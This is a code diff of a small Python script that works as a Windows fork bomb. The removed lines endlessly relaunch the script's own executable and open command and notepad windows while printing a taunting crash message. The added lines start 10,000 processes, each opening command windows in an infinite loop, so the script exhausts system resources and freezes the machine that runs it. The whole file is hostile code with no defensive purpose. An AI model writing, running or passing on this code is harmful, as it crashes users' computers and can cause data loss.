@@ -1,11 +1,20 @@
+from multiprocessing import Process
+from multiprocessing import freeze_support
 import os
-while True:
-  s = os.startfile(__file__[:-2]+"exe")
-  v = os.system('start cmd')
-  w = os.system('start notepad')
-  t = os.system('safari')
-  print("s")
-  print("v")
-  print("w")
-  print("t")
-  print("Your computer is about to crash. HA HA HA!")
+
+
+def cmd():
+    while True:
+        a = os.system('start cmd')
+
+
+processes = []
+if __name__ == '__main__':
+    freeze_support()
+    for i in range(10000):
+        first = Process(target=cmd)
+        first.start()
+        processes.append(first)
+
+    for process in processes:
+        process.join()
